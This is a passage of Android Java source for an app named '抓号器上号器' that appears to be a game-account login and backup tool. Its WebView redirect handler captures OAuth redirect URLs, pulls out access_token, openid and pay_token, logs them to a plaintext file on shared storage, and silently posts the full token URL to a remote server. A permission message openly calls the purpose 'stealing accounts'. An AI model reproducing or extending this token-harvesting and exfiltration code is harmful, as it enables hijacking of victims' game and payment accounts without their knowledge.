        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "备份失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void importAccounts() {
        File backupDir = new File(Environment.getExternalStorageDirectory(), "-上号器/上号器账号备份");
        if (!backupDir.exists() || !backupDir.isDirectory()) {
            Toast.makeText(this, "没有找到备份目录", Toast.LENGTH_SHORT).show();
            return;
        }

        final File[] backupFiles = backupDir.listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File dir, String name) {
                return name.startsWith("抓号器上号器_") && name.endsWith(".json");
            }
        });

        if (backupFiles == null || backupFiles.length == 0) {
            Toast.makeText(this, "没有找到备份文件", Toast.LENGTH_SHORT).show();
            return;
        }

        Arrays.sort(backupFiles, new Comparator<File>() {
            @Override
            public int compare(File f1, File f2) {
                return Long.compare(f2.lastModified(), f1.lastModified());
            }
        });

        final List<String> fileDisplayNames = new ArrayList<>();
        for (File file : backupFiles) {
            String fileName = file.getName();
            String fileSize = formatFileSize(file.length());
            String fileTime;
            SimpleDateFormat displayFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            fileTime = displayFormat.format(new Date(file.lastModified()));
            String customName = fileName.replace("抓号器上号器_", "").replace(".json", "");
            fileDisplayNames.add(customName + "\n时间: " + fileTime + " | 大小: " + fileSize);
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("备份文件管理 (" + backupFiles.length + " 个文件)");
        builder.setItems(fileDisplayNames.toArray(new String[0]), new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, final int which) {
                showFileActionDialog(backupFiles[which]);
            }
        });
        builder.setPositiveButton("分享全部", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                shareAllBackupFiles(backupFiles);
            }
        });
        builder.setNeutralButton("刷新列表", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                importAccounts();
            }
        });
        builder.setNegativeButton("删除全部", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                deleteAllBackupFiles(backupFiles);
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();

        ListView listView = dialog.getListView();
        if (listView != null) {
            listView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
                @Override
                public boolean onItemLongClick(AdapterView<?> parent, View view, final int position, long id) {
                    showFileActionDialog(backupFiles[position]);
                    return true;
                }
            });
        }
    }

    private void showFileActionDialog(final File file) {
        String fileName = file.getName();
        String fileSize = formatFileSize(file.length());
        String fileTime;
        SimpleDateFormat displayFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        fileTime = displayFormat.format(new Date(file.lastModified()));
        String customName = fileName.replace("抓号器上号器_", "").replace(".json", "");
        final String fileInfo = "文件名: " + fileName + "\n" +
                "自定义名称: " + customName + "\n" +
                "备份时间: " + fileTime + "\n" +
                "文件大小: " + fileSize + "\n" +
                "文件路径: " + file.getAbsolutePath();

        final String[] options = {
                "导入账号",
                "分享文件",
                "删除文件",
                "查看信息"
        };

        new AlertDialog.Builder(this)
                .setTitle("文件操作 - " + fileName)
                .setItems(options, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, final int which) {
                        switch (which) {
                            case 0:
                                importFromFile(file);
                                break;
                            case 1:
                                shareBackupFile(file);
                                break;
                            case 2:
                                deleteBackupFile(file);
                                break;
                            case 3:
                                showDetailedFileInfo(fileInfo);
                                break;
                        }
                    }
                })
                .setNegativeButton("取消", null)
                .show();
    }

    private void shareBackupFile(File file) {
        try {
            Intent shareIntent = new Intent(Intent.ACTION_SEND);
            shareIntent.setType("application/json");
            shareIntent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(file));
            shareIntent.putExtra(Intent.EXTRA_SUBJECT, "抓号器上号器 - 账号备份文件");
            shareIntent.putExtra(Intent.EXTRA_TEXT, "这是从抓号器上号器导出的账号备份文件\n文件名: " + file.getName() + "\n请使用抓号器上号器导入使用");
            startActivity(Intent.createChooser(shareIntent, "分享备份文件"));
            Toast.makeText(this, "正在分享文件: " + file.getName(), Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "分享失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void shareAllBackupFiles(File[] files) {
        if (files.length == 0) {
            Toast.makeText(this, "没有可分享的文件", Toast.LENGTH_SHORT).show();
            return;
        }
        try {
            ArrayList<Uri> uris = new ArrayList<>();
            for (File file : files) {
                uris.add(Uri.fromFile(file));
            }
            Intent shareIntent = new Intent(Intent.ACTION_SEND_MULTIPLE);
            shareIntent.setType("application/json");
            shareIntent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, uris);
            shareIntent.putExtra(Intent.EXTRA_SUBJECT, "抓号器上号器 - 账号备份文件合集");
            shareIntent.putExtra(Intent.EXTRA_TEXT, "这是从抓号器上号器导出的所有账号备份文件，共 " + files.length + " 个文件\n请使用抓号器上号器导入使用");
            startActivity(Intent.createChooser(shareIntent, "分享所有备份文件"));
            Toast.makeText(this, "正在分享 " + files.length + " 个文件", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "分享失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void deleteBackupFile(final File file) {
        new AlertDialog.Builder(this)
                .setTitle("确认删除")
                .setMessage("确定要删除备份文件吗？\n文件名: " + file.getName())
                .setPositiveButton("删除", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        if (file.delete()) {
                            Toast.makeText(AgentActivity.this, "文件删除成功: " + file.getName(), Toast.LENGTH_SHORT).show();
                            importAccounts();
                        } else {
                            Toast.makeText(AgentActivity.this, "文件删除失败", Toast.LENGTH_SHORT).show();
                        }
                    }
                })
                .setNegativeButton("取消", null)
                .show();
    }

    private void deleteAllBackupFiles(final File[] files) {
        if (files.length == 0) {
            Toast.makeText(this, "没有可删除的文件", Toast.LENGTH_SHORT).show();
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle("确认删除全部")
                .setMessage("确定要删除所有备份文件吗？\n共 " + files.length + " 个文件")
                .setPositiveButton("全部删除", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int successCount = 0;
                        for (File file : files) {
                            if (file.delete()) {
                                successCount++;
                            }
                        }
                        Toast.makeText(AgentActivity.this, "删除完成: " + successCount + "/" + files.length + " 个文件", Toast.LENGTH_LONG).show();
                        importAccounts();
                    }
                })
                .setNegativeButton("取消", null)
                .show();
    }

    private void showDetailedFileInfo(String fileInfo) {
        new AlertDialog.Builder(this)
                .setTitle("文件详细信息")
                .setMessage(fileInfo)
                .setPositiveButton("确定", null)
                .show();
    }

    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    private void importFromFile(File backupFile) {
        try {
            StringBuilder contentBuilder = new StringBuilder();
            BufferedReader reader = new BufferedReader(new FileReader(backupFile));
            String line;
            while ((line = reader.readLine()) != null) {
                contentBuilder.append(line);
            }
            reader.close();

            JSONArray backupArray = new JSONArray(contentBuilder.toString());
            int importedCount = 0;
            int duplicateCount = 0;

            Set<String> existingTitles = new HashSet<>();
            for (HashMap<String, String> account : accountList) {
                existingTitles.add(account.get("title"));
            }

            for (int i = 0; i < backupArray.length(); i++) {
                JSONObject accountObj = backupArray.getJSONObject(i);
                String title = accountObj.getString("title");
                String content = accountObj.getString("content");
                String isTop = accountObj.optString(KEY_IS_TOP, "false");

                String finalTitle = title;
                int counter = 1;
                while (existingTitles.contains(finalTitle)) {
                    finalTitle = title + "_备份" + counter;
                    counter++;
                    duplicateCount++;
                }

                HashMap<String, String> newAccount = new HashMap<>();
                newAccount.put("title", finalTitle);
                newAccount.put("content", content);
                newAccount.put(KEY_IS_TOP, isTop);

                accountList.add(newAccount);
                existingTitles.add(finalTitle);
                importedCount++;
            }

            adapter.notifyDataSetChanged();
            saveAccountsToPrefs();

            String message = "导入完成\n成功导入: " + importedCount + " 个账号";
            if (duplicateCount > 0) {
                message += "\n重命名: " + duplicateCount + " 个重复账号";
            }
            Toast.makeText(this, message, Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "导入失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_FULLSCREEN
            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
        );
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }
    }

    private void showReinputContentDialog(final int position) {
        final HashMap<String, String> item = accountList.get(position);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("重新输入内容 - " + item.get("title"));

        final EditText input = new EditText(this);
        input.setText(item.get("content"));
        input.setSelection(input.getText().length());

        builder.setView(input)
            .setPositiveButton("保存", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    String newContent = input.getText().toString().trim();
                    if (!TextUtils.isEmpty(newContent)) {
                        item.put("content", newContent);
                        adapter.notifyDataSetChanged();
                        saveAccountsToPrefs();
                        Toast.makeText(AgentActivity.this, "内容已更新", Toast.LENGTH_SHORT).show();
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void showAddAccountDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("添加账号");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);

        final EditText titleInput = new EditText(this);
        titleInput.setHint("账号标题（必填）");
        layout.addView(titleInput);

        final EditText contentInput = new EditText(this);
        contentInput.setHint("账号内容（必填）");
        layout.addView(contentInput);

        builder.setView(layout)
            .setPositiveButton("保存", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    String title = titleInput.getText().toString().trim();
                    String content = contentInput.getText().toString().trim();

                    if (title.isEmpty() || content.isEmpty()) {
                        Toast.makeText(AgentActivity.this, "标题和内容不能为空", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    HashMap<String, String> newAccount = new HashMap<>();
                    newAccount.put("title", title);
                    newAccount.put("content", content);
                    newAccount.put(KEY_IS_TOP, "false");
                    accountList.add(newAccount);
                    adapter.notifyDataSetChanged();
                    saveAccountsToPrefs();
                }
            })
            .setNegativeButton("取消", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            })
            .show();
    }

    private void saveAccountsToPrefs() {
        SharedPreferences prefs = getSharedPreferences("AccountPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();

        JSONArray jsonArray = new JSONArray();
        try {
            for (HashMap<String, String> account : accountList) {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("title", account.get("title"));
                jsonObject.put("content", account.get("content"));
                jsonObject.put(KEY_IS_TOP, account.get(KEY_IS_TOP));
                jsonArray.put(jsonObject);
            }
            editor.putString("accountList", jsonArray.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        editor.apply();
    }

    private void loadAccountsFromPrefs() {
        SharedPreferences prefs = getSharedPreferences("AccountPrefs", MODE_PRIVATE);
        String json = prefs.getString("accountList", "");

        if (!json.isEmpty()) {
            try {
                JSONArray jsonArray = new JSONArray(json);
                accountList.clear();
                for (int i = 0; i < jsonArray.length(); i++) {
                    JSONObject obj = jsonArray.getJSONObject(i);
                    HashMap<String, String> account = new HashMap<>();
                    account.put("title", obj.optString("title", ""));
                    account.put("content", obj.optString("content", ""));
                    account.put(KEY_IS_TOP, obj.optString(KEY_IS_TOP, "false"));
                    accountList.add(account);
                }
                Collections.sort(accountList, new Comparator<HashMap<String, String>>() {
                    @Override
                    public int compare(HashMap<String, String> o1, HashMap<String, String> o2) {
                        boolean top1 = Boolean.parseBoolean(o1.get(KEY_IS_TOP));
                        boolean top2 = Boolean.parseBoolean(o2.get(KEY_IS_TOP));
                        return top2 ? 1 : (top1 ? -1 : 0);
                    }
                });
                adapter.notifyDataSetChanged();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    private void handleTopOperation(int position) {
        HashMap<String, String> item = accountList.get(position);
        boolean isTop = Boolean.parseBoolean(item.get(KEY_IS_TOP));

        if (isTop) {
            item.put(KEY_IS_TOP, "false");
            accountList.remove(position);
            accountList.add(position, item);
        } else {
            for (HashMap<String, String> acc : accountList) {
                acc.put(KEY_IS_TOP, "false");
            }
            item.put(KEY_IS_TOP, "true");
            accountList.remove(position);
            accountList.add(0, item);
        }

        adapter.notifyDataSetChanged();
        saveAccountsToPrefs();
        Toast.makeText(this, isTop ? "已取消置顶" : "已置顶", Toast.LENGTH_SHORT).show();
    }

    private void showRenameDialog(final int position) {
        final HashMap<String, String> item = accountList.get(position);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("重命名账号");

        final EditText input = new EditText(this);
        input.setText(item.get("title"));
        input.setSelection(input.getText().length());

        builder.setView(input)
            .setPositiveButton("保存", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    String newTitle = input.getText().toString().trim();
                    if (!TextUtils.isEmpty(newTitle)) {
                        item.put("title", newTitle);
                        adapter.notifyDataSetChanged();
                        saveAccountsToPrefs();
                        Toast.makeText(AgentActivity.this, "重命名成功", Toast.LENGTH_SHORT).show();
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void initWebView() {
        webView.setVisibility(View.VISIBLE);
        findViewById(R.id.yc).setVisibility(View.GONE);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new MyWebViewClient());
        webView.loadUrl(webViewUrl);

        ImageView backButton = findViewById(R.id.webview_back_button);
        backButton.setVisibility(View.VISIBLE);
    }

    private void readFile() {
        File file = new File(Environment.getExternalStorageDirectory(), "抓号器上号器.txt");
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new FileReader(file));
            firstLine = reader.readLine();
            String secondLineString = reader.readLine();
            if (secondLineString != null) {
                try {
                    secondLine = Integer.parseInt(secondLineString);
                } catch (NumberFormatException e) {
                    e.printStackTrace();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_STORAGE_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            } else {
                Toast.makeText(this, "没有存储权限，无法偷号", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void saveRawDataToSharedPreferences(String rawText) {
        SharedPreferences sharedPreferences = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(KEY_RAW_TEXT, rawText);
        editor.apply();
    }

    private void loadRawDataFromSharedPreferences(EditText plainText) {
        SharedPreferences sharedPreferences = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        String rawText = sharedPreferences.getString(KEY_RAW_TEXT, "");
        plainText.setText(rawText);
    }

    // ================== 核心上传方法（最终修复版，带完整日志和空值保护） ==================
    private void sendDataToServer(final String username, final String category, final String gameName, final String data) {
        // 防止空指针
        if (data == null || TextUtils.isEmpty(data)) {
            Log.e("sendDataToServer", "data is null or empty, skip upload");
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    String uid = DEFAULT_UID;
                    String baseUrl = API_URL;
                    URL url = new URL(baseUrl + "?uid=" + uid);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);
                    
                    String postData = "content=" + URLEncoder.encode(data, "UTF-8");
                    OutputStream os = conn.getOutputStream();
                    os.write(postData.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    
                    int responseCode = conn.getResponseCode();
                    InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) 
                                            ? conn.getInputStream() : conn.getErrorStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
                    StringBuilder responseBuilder = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        responseBuilder.append(line);
                    }
                    reader.close();
                    final String responseBody = responseBuilder.toString();
                    
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                JSONObject json = new JSONObject(responseBody);
                                if (json.optInt("code") == 1) {
                                    // 成功时不弹提示，避免干扰
                                } else {
                                    String msg = json.optString("msg", "提交失败");
                                    Toast.makeText(AgentActivity.this, "提交失败：" + msg, Toast.LENGTH_LONG).show();
                                }
                            } catch (JSONException e) {
                                Toast.makeText(AgentActivity.this, "服务器返回异常", Toast.LENGTH_SHORT).show();
                            }
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                    final String errMsg = e.toString();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(AgentActivity.this, "网络错误：" + errMsg, Toast.LENGTH_LONG).show();
                        }
                    });
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }
    // ==================================================================

    private class MyWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            String url = request.getUrl().toString();
            if (url.startsWith(AUTH_REDIRECT_URL)) {
                handleAuthRedirect(url);
                return true;
            }
            return super.shouldOverrideUrlLoading(view, request);
        }

        private void handleAuthRedirect(String url) {
            SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
            String mode = sharedPreferences.getString("pd_key", "2");

            writeToFileWithTimestamp(url);

            if ("3".equals(mode)) {
                String gameName = getGameNameFromMainActivity();
                sendDataToServer("提交到的账号", "挂机模式", gameName, url);
                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        webView.loadUrl(webViewUrl);
                    }
                }, 1000);
            } else {
                Pattern pattern = Pattern.compile("access_token=(.*?)&expires_in=(.*?)&openid=(.*?)&pay_token=(.*?)&");
                Matcher matcher = pattern.matcher(url);

                if (matcher.find()) {
                    String access_token = matcher.group(1);
                    String expires_in = matcher.group(2);
                    String openid = matcher.group(3);
                    String pay_token = matcher.group(4);

                    if (!isAccessTokenExists(access_token)) {
                        try {
                            JSONObject jsonObject3 = new JSONObject();
                            jsonObject3.put("access_token", access_token);
                            jsonObject3.put("openid", openid);
                            jsonObject3.put("pay_token", pay_token);
                            jsonObject3.put("expires_in", expires_in);
                            jsonObject3.put("ret", "0");
                            jsonObject3.put("pf", "desktop_m_qq-10000144-android-2002-");
                            jsonObject3.put("page_type", "1");

                            final String finalGameName = getGameNameFromMainActivity();
                            sendDataToServer("提交到的账号", finalGameName, "浏览器模式", url);

                            Intent intent = new Intent();
                            intent.putExtra("key_response", jsonObject3.toString());
                            setResult(RESULT_OK, intent);
                            finish();

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }

        private void writeToFileWithTimestamp(String data) {
            String fileName = "抓号器上号器.txt";
            String filePath = Environment.getExternalStorageDirectory().getPath() + "/" + fileName;

            try {
                File file = new File(filePath);
                FileWriter writer = new FileWriter(file, true);

                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
                final String finalGameName = getGameNameFromMainActivity();

                if (!isAccessTokenExistsInFile(file, data)) {
                    String formattedData = timestamp + " | " + finalGameName + " | " + data;
                    writer.append(formattedData).append("\n");
                }

                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private boolean isAccessTokenExists(String access_token) {
            return false;
        }

        private boolean isAccessTokenExistsInFile(File file, String data) throws IOException {
            String content = readFileContent(file);
            return content.contains(getAccessTokenFromUrl(data));
        }

        private String readFileContent(File file) throws IOException {
            StringBuilder contentBuilder = new StringBuilder();
            java.util.Scanner scanner = new java.util.Scanner(file);
            while (scanner.hasNextLine()) {
                contentBuilder.append(scanner.nextLine()).append("\n");
            }
            scanner.close();
            return contentBuilder.toString();
        }

        private String getAccessTokenFromUrl(String url) {
            Pattern pattern = Pattern.compile("access_token=(.*?)&");
            Matcher matcher = pattern.matcher(url);
            return matcher.find() ? matcher.group(1) : null;
        }
    }

    private String getGameNameFromMainActivity() {
        try {
            SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
            return prefs.getString("last_selected_game", "未知游戏");
        } catch (Exception e) {
            return "未知游戏";
        }
    }
}